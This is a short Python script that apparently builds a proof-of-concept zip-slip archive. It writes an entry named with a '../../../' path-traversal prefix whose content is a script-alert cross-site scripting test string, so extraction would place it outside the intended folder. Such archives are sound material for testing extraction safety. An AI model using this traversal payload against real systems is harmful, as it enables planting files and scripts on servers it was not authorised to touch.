import zipfile

import binary as binary

if __name__ == "__main__":
 try:
  binary = b'<script>alert("helloworld")</script>'
  zipFile = zipfile.ZipFile("test5.zip", "a", zipfile.ZIP_DEFLATED)
  info = zipfile.ZipInfo("test5.zip")
  zipFile.writestr("../../../safedog.html", binary)
  zipFile.close()
 except IOError as e:
  raise e